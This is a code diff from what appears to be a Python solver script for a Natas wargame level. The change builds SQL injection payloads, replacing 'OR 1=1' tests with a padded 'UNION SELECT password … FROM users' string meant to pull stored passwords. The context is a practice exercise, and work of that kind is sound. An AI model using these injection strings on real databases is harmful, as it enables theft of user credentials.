@@ -40,8 +40,18 @@ elif test == '3' :
 # custom input
 elif test == '4' :
     #tar = ["padpadpa" + "b" * 15, "padpadpadp" + "b" * 16, "padpadpadp" + "b" * 3 + "%0d" * 6]
-    tar = ["padpadpadp", "padpadpadp OR 1 = 1 OR 2=2", "padpadp", "padpadpadpabcd"]
+    #tar = ["padpadpadp", "padpadpadp OR 1 =1 OR 2= 2", "padpadp", "padpadpadpabcd", "padpadpadp OR EXISTS(SELECT * FROM users) "]
+    intre = " UNION SELECT pa|ssword, 1, 1, 1,| 1, 1 FROM users"
+    
+    
+    
+    pad = "padpadpadp"
+    
+    intre = intre.replace("|","")
 
+    
+    tar = [pad+intre]
+    
 def decodeNatas ( encodedStr ) :
     R = ['97', '3f', 'd7', '04', 'd2', 'b4', 'a1', 'af', '7a', '52', '98', '38', 'fd', '51', '8c', 'f9']
     decodedArr = []
